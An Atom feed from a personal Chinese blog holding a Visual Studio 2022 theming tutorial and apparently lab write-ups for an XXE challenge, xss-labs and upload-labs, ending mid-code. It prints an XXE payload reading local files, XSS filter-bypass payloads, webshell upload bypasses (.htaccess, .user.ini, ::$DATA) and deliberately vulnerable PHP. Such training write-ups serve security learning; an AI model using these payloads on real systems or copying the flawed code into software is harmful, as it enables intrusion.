<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s1rius&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2022-08-31T03:12:06.371Z</updated>
  <id>/</id>
  
  <author>
    <name>s1rius</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Visual Studio 2022界面美化教程</title>
    <link href="/2022/08/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
    <id>/2022/08/Visual Studio 2022界面美化教程/</id>
    <published>2022-08-29T11:23:58.841Z</published>
    <updated>2022-08-31T03:12:06.371Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://img-blog.csdnimg.cn/03104c8b341040169bb60d74b3b1fbde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p><p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p><p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p><p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p><p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p><p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p><p>新建项目 C#里面最后一项</p><p><a href="https://img-blog.csdnimg.cn/22fac527d6ff4b8daf11563025ce5a77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p><p><a href="da3a0ac9713d4b289c4351ca0ac8835d.png">点击并拖拽以移动</a></p><p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p><p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p><p><a href="https://img-blog.csdnimg.cn/e7c8d9ad7a424cd9aeb625bbc42e9657.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p><p>这个插件是为后面设置背景图片准备</p><p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p><p><a href="https://img-blog.csdnimg.cn/796d2426b994430f9a0a11ef42929ad0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p><p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p><p><a href="https://img-blog.csdnimg.cn/e86170054a0442cba2a16772dba96e81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p><p>​</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://img-blog.csdnimg.cn/03104c8b341040169bb60d74b3b1fbde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,tex
      
    
    </summary>
    
      <category term="资源" scheme="/categories/%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="visual studio 2022" scheme="/tags/visual-studio-2022/"/>
    
  </entry>
  
  <entry>
    <title>xxe</title>
    <link href="/2022/08/XXE/"/>
    <id>/2022/08/XXE/</id>
    <published>2022-08-29T10:18:54.839Z</published>
    <updated>2022-08-31T03:12:16.047Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码    </p><pre><code class="js">onclick=&quot;XMLFunction()&quot;</code></pre><p><img src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p><pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;        function XMLFunction(){            var xml = &#39;&#39; +                &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; +            &#39;&lt;root&gt;&#39; +            &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; +            &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; +            &#39; &lt;/root&gt;&#39;;            var xmlhttp = new XMLHttpRequest();            xmlhttp.onreadystatechange = function () {                if(xmlhttp.readyState == 4){                    console.log(xmlhttp.readyState);                    console.log(xmlhttp.responseText);                    alert(xmlhttp.responseText);                }            }            xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true);            xmlhttp.send(xml);        };    &lt;/script&gt;</code></pre><p>构造xxe攻击<br><img src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包==传的时候记得把注释删去==</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;&lt;!--构造实体--&gt;]&gt;&lt;root&gt;&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt;&lt;password&gt;2333&lt;/password&gt;&lt;/root&gt;</code></pre><p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p><p><img src="https://img-blog.csdnimg.cn/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p><pre><code class="php">&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    }else{        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    }    }catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p><ul><li>etc/hosts </li><li>proc/net/arp<br><img src="https://img-blog.csdnimg.cn/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li></ul>]]></content>
    
    <summary type="html">
    
      未完结草稿
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="xxe" scheme="/tags/xxe/"/>
    
      <category term="buuctf" scheme="/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab</title>
    <link href="/2022/08/xsslab/"/>
    <id>/2022/08/xsslab/</id>
    <published>2022-08-29T10:18:54.837Z</published>
    <updated>2022-08-31T03:12:10.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>没啥好说的<br>直接alert<br><img src="https://img-blog.csdnimg.cn/7cff66907f234fe8a9264319b7fcb8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><pre><code class="html">&lt;input name=keyword  value=&quot;test&quot;&gt;//改后是&lt;input name=keyword  value=&quot;1111&quot;&gt;&lt;script&gt;……&gt;//1111&quot;&gt;&lt;script&gt;……这是输入的部分前后闭合</code></pre><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src="https://img-blog.csdnimg.cn/1e4c13e4bc1d4537880deaf36855ab42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用了htmlspeialchars()函数    &lt;&gt;”都被过滤<br><img src="https://img-blog.csdnimg.cn/7c28fa1a02bd4383ac5f0cb8df3f3f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">二者都写可以</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>和上面一样</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>on 和 script都被过滤<br><img src="https://img-blog.csdnimg.cn/ec2a556e55ba4c9b84c5a07d3aedff9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这里用javascript:伪协议<br><img src="https://img-blog.csdnimg.cn/3d92413c5c624059aab10d022aefcf04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">出来的链接就是答案</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>可以大小写绕过</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>把特殊字符便空了<br>可以双写绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关卡的死死的<br>要编码绕过<br><img src="https://img-blog.csdnimg.cn/d233b7b1bba44b50b4aeeab90330e7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt></p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level  9"></a>level  9</h1><p>strpos函数看是否有http://<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把http://放最后面用//注释掉<br><img src="https://img-blog.csdnimg.cn/9d5db481746d4a9f95e8001a62ccd7bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h1><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框text</p><pre><code class="css">type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></pre><p>后面几关都要改t_sort<br>因为后端获取t_sort和user-agent等<br>要从相应注入点注入<br><img src="https://img-blog.csdnimg.cn/2040ace8d49d4257a8553820b103ff93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><blockquote><p>exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p><p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/" target="_blank" rel="noopener">exifviewer</a>网页<br>但是<br><img src="https://img-blog.csdnimg.cn/b0ccd08d54844a0ab8326ecdebed2497.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a28e85a7ace44b67a82fb0f28009f4a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>对script、/、空格进行了转换<br>空格不可以就用换行符</p><pre><code class="css">&lt;a%0atype=&quot;text&quot;%0a&quot;alert&quot;&gt;</code></pre><h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h1><p><img src="https://img-blog.csdnimg.cn/3636897a078a4392a3d629c6eabb3715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>火狐不支持swf格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src="https://img-blog.csdnimg.cn/b402d2307f0f45baacade379e596da50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>要找个支持flash的浏览器才能正常打开<br>17-20关都能用flash xss<br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">flash xss原理</a><br>但这里先用别的办法<br>以18关为例<br>注入点可以在arg02<br>但是你连swf都没有哪来的moouseover哪<br>所以得url连接一下</p><pre><code class="python">http://127.0.0.1/xss-labs/level18.php/xsf02.swf?a=?arg01=a&amp;arg02=%20onmouseover=javascript:alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/d2caecf88dc64e4fbbfe4d6aff041882.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h1><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html" target="_blank" rel="noopener">Flash XSS漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">flash xss原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">flash反编译工具</a><br>以下是大佬的payload</p><blockquote><p>卑微小杨在线emo<br>flash反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持flash的浏览器真没法做</p><p>18关</p><pre><code class="css">http://10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(/bmfx/)&quot;&gt;bmfx&lt;/a&gt; </code></pre><p>19关</p><pre><code class="css">http://10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\&quot;))}catch(e){alert(/bmfx/)}//%26width=998%26height=998</code></pre></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;level-1&quot;&gt;&lt;a href=&quot;#level-1&quot; class=&quot;headerlink&quot; title=&quot;level 1&quot;&gt;&lt;/a&gt;level 1&lt;/h1&gt;&lt;p&gt;没啥好说的&lt;br&gt;直接alert&lt;br&gt;&lt;img src=&quot;https://img-blog.csd
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="xss" scheme="/tags/xss/"/>
    
      <category term="xss-lab" scheme="/tags/xss-lab/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="/2022/08/upload-labs/"/>
    <id>/2022/08/upload-labs/</id>
    <published>2022-08-29T10:18:54.835Z</published>
    <updated>2022-08-31T03:12:02.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p>前端js过滤</p><pre><code class="javascript">function checkFile() {    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file == null || file == &quot;&quot;) {        alert(&quot;请选择要上传的文件!&quot;);        return false;    }    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    }}</code></pre><p>最简单的</p><p>burp抓包改后缀</p><h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]                        if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;文件类型不正确，请重新上传！&#39;;        }    } else {        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>用if函数结合<code>$_FILES[&#39;myfile&#39;][&#39;type&#39;]</code>判断MIME类型</p><p>后端改content-type</p><p>将<code>application/octect-stream</code>变为<code>image/jpeg、image/png或image/gif</code></p><h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) {                 $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>他经过了许多步</p><p>但其实他只匹配了<code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code></p><p>修改为php1，php2，php3，php4，php5，phtml等    与php解析相同的后缀皆可</p><h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件不允许上传!&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>这回匹配的倒挺多</p><p>不过配置文件没过滤</p><p>上传.htaccess文件</p><p>写入下面两句中的一句即可</p><p>第一句是全按php解析</p><p>第二句是将jpg按php解析</p><pre><code class="htaccess">SetHandler application/x-httpd-phpAddType application/x-https-php .jpg</code></pre><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p>和第4关类似</p><p>写入.user.ini文件</p><pre><code class="ini">auto_prepend_file=shell.jpg</code></pre><p>再配合shell</p><h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p>这一关源码补上了之前漏网的配置文件</p><p>但是这里可以使用大小写绕过</p><p>例如.Php</p><h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><p>这里补了一句</p><pre><code class="php"> $file_ext = strtolower($file_ext); //转换为小写</code></pre><p>没法大小写绕过了</p><p>这里通过补空格来绕过</p><p><code>.php (空格)</code></p><h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><p>这里补了句首位去空</p><pre><code class="php">$file_ext = trim($file_ext); //首尾去空</code></pre><p>这次用 . 绕过</p><p><code>.php.</code></p><p>和上面一样</p><p>后面的空格和 . 会被服务器自动删除</p><h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><p>这里补了</p><pre><code class="php">$file_name = deldot($file_name);//删除文件名末尾的点</code></pre><p>比之前少了一句</p><pre><code class="php">$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></pre><p>使用</p><pre><code class="shell">.php::$DATA</code></pre><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p>这里补回了::$DATA仔细看这里过滤的顺序</p><pre><code class="php">$deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#39;.&#39;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空</code></pre><p>仔细看这里过滤的顺序</p><p>先去的点然后去的空</p><p>于是可以</p><p><code>.php. .</code></p><p>过滤后剩下</p><p><code>.php.</code></p><h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) {            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>这里用trim函数删去通过<code>$_FILES[&#39;upload_ext&#39;][&#39;tmp_name&#39;]</code>得到的浏览器通过报文传过来的在burpsuite中的变量名是filename的字符串左右两边的空格    这就省了几步过滤</p><p>但是下面这句</p><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>是匹配到黑名单后替换成空</p><p>于是这里可以双写绕过</p><p><code>.pphphp</code></p><h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>这次使用了白名单过滤</p><pre><code class="php">$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = 